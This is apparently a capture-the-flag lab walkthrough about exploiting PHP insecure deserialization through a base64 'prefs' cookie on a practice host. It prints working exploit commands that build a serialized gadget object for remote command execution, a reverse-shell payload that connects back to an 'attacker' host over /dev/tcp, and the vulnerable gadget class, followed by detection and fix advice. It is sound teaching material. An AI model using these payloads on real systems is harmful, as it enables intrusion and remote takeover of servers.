# C09 · Station F — PHP insecure deserialization · ★★★☆

> **Chapter:** [[Chapter-09-Overview]] · **Next:** [[Reverse-Shell-Reference]]
> **Host:** `hollow-portal-01` (`target-web`) · **Target:** `/prefs.php` (the `prefs` cookie)
> **The bug:** the portal `unserialize()`s a base64 object from the `prefs` cookie. `unserialize()` rebuilds **any** class in scope and fires its magic methods — one dangerous gadget is RCE.

The subtlest route: no shell, no include, no template — just an object the server trusts too much.

---

## 1. Exploit — do this first

Craft a `MaintenanceTask` object whose `cmd` is your command, base64 it, send it as the `prefs` cookie:

```bash
attacker$ CMD='cat /var/www/flag.txt'
attacker$ SER="O:15:\"MaintenanceTask\":1:{s:3:\"cmd\";s:${#CMD}:\"${CMD}\";}"
attacker$ COOKIE=$(printf '%s' "$SER" | base64 -w0)
attacker$ curl --cookie "prefs=${COOKIE}" http://target-web/prefs.php | grep R2R
R2R{w3b_rce_is_your_front_d00r}
```

| Token | What it does |
|---|---|
| `O:15:"MaintenanceTask"` | a serialized object of the 15-char gadget class |
| `s:3:"cmd";s:N:"…"` | sets `$cmd` (string, length `N` = `${#CMD}`) |
| `base64 -w0` | the cookie value is base64, as the app stores it |
| `--cookie "prefs=…"` | the server `unserialize()`s it → `__wakeup()` runs `$cmd` |

For a reverse shell, set `CMD='bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"'` and recompute `${#CMD}` before encoding.

---

## 2. How you find it

```bash
attacker$ curl -s -i -X POST -d 'theme=dark&layout=grid' http://target-web/prefs.php | grep -i set-cookie
set-cookie: prefs=Tzo1OiJQcmVmcyI6Mjp7…
attacker$ printf '%s' 'Tzo1OiJQcmVmcyI6Mjp7…' | base64 -d
O:5:"Prefs":2:{s:5:"theme";s:4:"dark";s:6:"layout";s:4:"grid";}
```

The cookie decodes to a **serialized PHP object** (`O:5:"Prefs":…`). Anything that stores `serialize()` output in a round-tripped cookie is calling `unserialize()` on your input. Now you need a gadget class.

---

## 3. Why it works

```php
$obj = unserialize(base64_decode($_COOKIE['prefs']));   // no allowed_classes
```

`unserialize()` is a constructor for arbitrary objects: the attacker picks the class and its property values, and PHP fires magic methods while rebuilding it. `inc/prefs_lib.php` ships a gadget whose `__wakeup()` runs during `unserialize()` itself:

```php
class MaintenanceTask {
    public $cmd = '';
    public function __wakeup() { if ($this->cmd !== '') system($this->cmd); }
}
```

The app only means to load a `Prefs` object — but `unserialize()` will happily build a `MaintenanceTask`, and `__wakeup()` fires **before** the code checks the type. One dangerous magic method in scope is enough.

---

## 4. Pitfalls

- **Byte-count the string length.** `s:N:"…"` must have `N = ${#CMD}` exactly, or `unserialize()` returns `false` and nothing fires. Easiest: `php -r 'echo serialize(new MaintenanceTask());'` after setting `$cmd`.
- **`__wakeup()` runs even though the result isn't a `Prefs`** — the `instanceof Prefs` check happens *after* the magic method already ran.
- **The cookie is base64 of the serialized string**, matching how the app saves it.
- **Reverse shells** run via `system()` → `sh`; wrap in `bash -c`.

---

## 5. Detect & fix

- **Detect:** `unserialize()` on any request-derived value in code review; base64-of-`O:`/`a:` blobs in cookies/params; PHP spawning unexpected children after a crafted request. Recipes in [[Blue-Team-Playbook]].
- **Fix:** don't deserialize untrusted input — use `json_encode`/`json_decode`; if PHP serialization is unavoidable, pass `unserialize($d, ['allowed_classes' => [Prefs::class]])` and HMAC-sign the blob. More in [[Blue-Team-Playbook]].

---

## 6. What you learned

- `unserialize()` on attacker input is remote object instantiation — any gadget with a dangerous `__wakeup`/`__destruct` is RCE (see `phpggc` for real POP chains).
- Round-tripped serialized cookies are a red flag; `json` is the safe transport.
- That's all six routes. Now make every one land cleanly: [[Reverse-Shell-Reference]], then the capstone on [[Chapter-09-Overview]].

> Next: [[Reverse-Shell-Reference]] · Related: [[Chapter-09-Overview]] · [[Blue-Team-Playbook]]
